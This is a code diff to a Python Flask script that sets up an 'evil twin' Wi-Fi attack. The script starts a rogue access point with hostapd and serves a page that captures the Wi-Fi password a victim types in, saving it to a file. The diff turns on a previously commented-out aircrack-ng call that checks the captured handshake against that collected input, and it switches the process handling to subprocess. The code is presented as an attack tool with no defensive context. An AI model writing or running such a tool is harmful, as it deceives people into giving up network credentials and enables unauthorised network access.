@@ -24,8 +24,8 @@ ignore_broadcast_ssid=0
 with open("hostapd.conf", "w") as conf_file:
     conf_file.write(hostapd_config)
 
-# Start hostapd
-os.system("sudo hostapd hostapd.conf &")
+# Start hostapd using subprocess
+hostapd_process = subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
 
 @app.route('/')
 def index():
@@ -39,7 +39,7 @@ def check_password():
         file.write(user_input)
 
     # Uncomment the line below to run aircrack-ng with EvilTwin capabilities
-    # os.system("aircrack-ng MyHandShake.cap -w output.txt")
+    subprocess.run(["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"])
 
     if user_input == "your_expected_password":
         message = "Correct password :D"
@@ -49,4 +49,8 @@ def check_password():
     return jsonify({'message': message})
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=80, debug=True)
+    try:
+        app.run(host='0.0.0.0', port=80, debug=True)
+    finally:
+        # Ensure to terminate the hostapd process when the Flask app exits
+        hostapd_process.terminate()
